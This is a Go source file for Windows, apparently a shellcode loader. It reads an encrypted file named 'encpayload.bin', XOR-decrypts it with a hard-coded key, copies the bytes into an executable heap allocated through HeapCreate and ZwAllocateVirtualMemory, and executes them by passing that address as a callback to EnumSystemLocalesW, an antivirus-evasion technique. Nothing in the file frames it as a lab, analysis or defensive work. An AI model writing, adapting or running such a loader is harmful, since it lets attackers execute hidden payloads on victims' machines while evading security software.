package main

import (
	"golang.org/x/sys/windows"
	"io/ioutil"
	"os"
	"unsafe"
)

const (
	MEM_COMMIT                 = 0x1000
	HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	PAGE_EXECUTE_READWRITE     = 0x40
)

var (
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	kernel32                = windows.NewLazyDLL("kernel32.dll")
	ZwAllocateVirtualMemory = ntdll.NewProc("ZwAllocateVirtualMemory")
	HeapCreate               = kernel32.NewProc("HeapCreate")
	EnumSystemLocalesW      = kernel32.NewProc("EnumSystemLocalesW")
	RtlCopyMemory  = ntdll.NewProc("RtlCopyMemory")

)

func main(){
	fileRawData,_:= ioutil.ReadFile("encpayload.bin")
	key  := []byte("wulala")
	//var end int
	//var RawExecData = make([]byte,len(fileRawData) + 3)
	//var RawExecData = make([]byte,len(fileRawData) )
	for i,j :=0,0;i<len(fileRawData);i++{
		fileRawData[i] = fileRawData[i] ^ key[j]
		j = (j+1)%len(key)

	}
	addr, _, err := HeapCreate.Call(uintptr(HEAP_CREATE_ENABLE_EXECUTE), 0, 0)
	ZwAllocateVirtualMemory.Call(addr, 0, 0, 0x100000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	ptr := addr
	for i := 0;i<len(fileRawData);i++{
		*(*byte)(unsafe.Pointer(ptr)) = fileRawData[i]
		ptr ++
	}
	//_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&RawExecData[0])), uintptr(len(RawExecData)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
	EnumSystemLocalesW.Call(addr, 0)
}
